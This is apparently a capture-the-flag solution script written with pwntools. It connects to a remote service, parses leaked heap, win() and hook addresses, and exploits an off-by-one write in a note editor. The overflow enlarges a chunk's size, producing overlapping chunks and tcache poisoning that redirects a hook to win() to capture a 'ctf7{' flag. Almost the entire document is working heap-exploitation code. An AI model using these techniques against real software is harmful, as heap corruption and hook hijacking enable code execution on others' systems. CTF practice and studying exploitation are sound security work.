#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# The edit function appends content - this is where off-by-one happens
# If we create a note of size N and append 1 byte, we write N+1 bytes total

# Create note of size 0x18 (chunk will be 0x20)
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'A' * 24)  # Fill exactly
io.recvuntil(b'>')

# Create second note
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'B' * 24)
io.recvuntil(b'>')

# Create third note (barrier)
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'C' * 24)
io.recvuntil(b'>')

# Now edit note 0 - append 1 byte
# This will write past the end and corrupt note 1's size field
io.sendline(b'2')
io.sendlineafter(b':', b'0')
io.sendlineafter(b':', b'\x91')  # Overwrite size from 0x21 to 0x91
io.recvuntil(b'>')

# Free note 1 (thinks it's 0x90 bytes)
io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Allocate smaller chunk - creates overlap with note 2
io.sendline(b'1')
io.sendlineafter(b':', b'16')
# Write tcache fd to point to hook
payload = p64(0) + p64(hook)
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Allocate to consume freed space
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'D' * 24)
io.recvuntil(b'>')

# Next allocation at hook
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', p64(win) + b'E' * 16)
io.recvuntil(b'>')

# Trigger - try everything
log.info("Triggering...")

# Delete
io.sendline(b'3')
io.sendlineafter(b':', b'0')
output1 = io.recv(timeout=1)

# Print
io.sendline(b'4')
io.sendlineafter(b':', b'2')
output2 = io.recv(timeout=1)

# Exit
io.sendline(b'5')
output3 = io.recvall(timeout=2)

result = (output1 + output2 + output3).decode(errors='ignore')
print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"FLAG: {flag.group(0)}")
else:
    log.warning("No flag found - exploit may need adjustment")

io.close()
